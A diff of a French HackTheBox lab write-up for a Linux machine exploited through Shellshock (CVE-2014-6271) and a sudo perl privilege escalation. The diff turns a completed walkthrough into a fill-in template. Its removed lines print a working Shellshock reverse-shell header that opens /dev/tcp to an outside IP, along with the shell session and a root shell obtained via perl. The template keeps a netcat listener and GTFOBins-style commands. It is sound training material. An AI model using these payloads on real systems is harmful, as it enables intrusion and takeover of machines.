@@ -5,7 +5,7 @@
 | **Plateforme** | HackTheBox |
 | **OS** | Linux (Ubuntu) |
 | **Difficulté** | 🟢 Easy |
-| **Date** | 2026-09-28 |
+| **Date** | 2026-__-__ |
 | **Vecteur** | <à compléter : foothold web → privesc sudo> |
 | **CVE** | CVE-2014-6271 (famille « Shellshock ») |
 | **Tags** | web · cgi · shellshock · sudo · gtfobins |
@@ -52,88 +52,18 @@ La page par défaut ne dit rien → il faut **découvrir le contenu caché**.
 
 ```bash
 # Brute force de répertoires
-┌──(kali㉿kali)-[~]
-└─$ gobuster dir -u http://<IP_CIBLE>/ -w SecLists-master/Discovery/Web-Content/common.txt -t 10
-
-===============================================================
-Gobuster v3.8.2
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://<IP_CIBLE>/
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                SecLists-master/Discovery/Web-Content/common.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.8.2
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-.hta                 (Status: 403) [Size: 292]
-.htaccess            (Status: 403) [Size: 297]
-.htpasswd            (Status: 403) [Size: 297]
-cgi-bin/             (Status: 403) [Size: 296]
-index.html           (Status: 200) [Size: 137]
-server-status        (Status: 403) [Size: 301]
-Progress: 4752 / 4752 (100.00%)
-===============================================================
-Finished
-===============================================================
-
+gobuster dir -u http://<IP_CIBLE>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40
+# ou : feroxbuster -u http://<IP_CIBLE>/
 
 # Une fois un répertoire "exécutable" trouvé, chercher les SCRIPTS qui s'y trouvent
 # (pense aux extensions de scripts serveur : .sh, .cgi, .pl ...)
-┌──(kali㉿kali)-[~]
-└─$ gobuster dir -u http://<IP_CIBLE>/cgi-bin/ -w SecLists-master/Discovery/Web-Content/combined_words.txt -x sh,php -t 10
-
-===============================================================
-Gobuster v3.8.2
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://<IP_CIBLE>/cgi-bin/
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                SecLists-master/Discovery/Web-Content/combined_words.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.8.2
-[+] Extensions:              sh,php
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-.hta                 (Status: 403) [Size: 300]
-.hta.sh              (Status: 403) [Size: 303]
-.hta.php             (Status: 403) [Size: 304]
-.htaccess            (Status: 403) [Size: 305]
-.htaccess.php        (Status: 403) [Size: 309]
-.htaccess.sh         (Status: 403) [Size: 308]
-.htpasswd            (Status: 403) [Size: 305]
-.htpasswd.sh         (Status: 403) [Size: 308]
-.htpasswd.php        (Status: 403) [Size: 309]
-user.sh              (Status: 200) [Size: 118]
-.html                (Status: 403) [Size: 301]
-.html.sh             (Status: 403) [Size: 304]
-.html.php            (Status: 403) [Size: 305]
-.htm.sh              (Status: 403) [Size: 303]
-.htm                 (Status: 403) [Size: 300]
-.htm.php             (Status: 403) [Size: 304]
-.                    (Status: 403) [Size: 296]
-.htc                 (Status: 403) [Size: 300]
-.htc.php             (Status: 403) [Size: 304]
-.htc.sh              (Status: 403) [Size: 303]
+gobuster dir -u http://<IP_CIBLE>/<repertoire>/ -w <wordlist> -x sh,cgi,pl
 ```
 
 > Indice de méthode : un répertoire dont le **nom** évoque l'exécution de scripts côté serveur
-> LA piste. Trouve le script qu'il contient — c'est lui la porte d'entrée.
-```bash
-┌──(kali㉿kali)-[~]
-└─$ curl http://<IP_CIBLE>/cgi-bin/user.sh 
-Content-Type: text/plain
+> est LA piste. Trouve le script qu'il contient — c'est lui la porte d'entrée.
 
-Just an uptime test script
-
- 06:17:30 up  3:48,  0 users,  load average: 0.00, 0.00, 0.00
-```
+Trouvé : `______________________`
 
 ---
 
@@ -156,24 +86,10 @@ Just an uptime test script
 # 2) Se mettre à l'écoute
 nc -lvnp 4444
 
-┌──(kali㉿kali)-[~]
-└─$ curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.236/4444 0>&1" http://10.129.109.72/cgi-bin/user.sh
-
-┌──(kali㉿kali)-[~]
-└─$ nc -lvnp 4444        
-listening on [any] 4444 ...
-connect to [] from (UNKNOWN) [] 60658
-bash: no job control in this shell
-shelly@Shocker:/usr/lib/cgi-bin$ whoami
-whoami
-shelly
-shelly@Shocker:/usr/lib/cgi-bin$ 
-
-
 # 3) Déclencher un reverse shell (voir ta fiche reverse-shells) via l'en-tête injecté.
 ```
 
-- **Utilisateur obtenu :** `shelly` ⚠️ (PAS root — c'est le compte du service web)
+- **Utilisateur obtenu :** `______` ⚠️ (PAS root — c'est le compte du service web)
 - **Stabilisation du shell :**
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'   # puis Ctrl+Z, stty raw -echo; fg, export TERM=xterm
@@ -194,19 +110,12 @@ Dérouler la checklist `linux-privesc` AVANT d'escalader. Le premier réflexe ic
 sudo -l          # que puis-je lancer en root SANS mot de passe ?
 id ; whoami
 # si sudo -l ne donne rien : find / -perm -4000 2>/dev/null ; getcap -r / 2>/dev/null ; crontab -l
-
-# Résultat de `sudo -l` : 
-
-shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
-sudo -l
-Matching Defaults entries for shelly on Shocker:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User shelly may run the following commands on Shocker:
-    (root) NOPASSWD: /usr/bin/perl
 ```
+
+Résultat de `sudo -l` : `______________________`
+
 ---
+
 ## 5. Élévation de privilèges
 
 **Piste : abus d'un binaire autorisé en `sudo` (GTFOBins).**
@@ -217,13 +126,8 @@ User shelly may run the following commands on Shocker:
   en root, ils te donnent un **shell root**.
 
 ```bash
-
 # Forme générale (adapter au binaire trouvé, cf. GTFOBins)
-shelly@Shocker:/usr/lib/cgi-bin$ sudo /usr/bin/perl -e 'exec "/bin/sh";'
-sudo /usr/bin/perl -e 'exec "/bin/sh";'
-id
-uid=0(root) gid=0(root) groups=0(root)
-
+sudo <binaire> -e 'exec "/bin/sh";'      # exemple pour perl
 ```
 
 **Résultat attendu :**
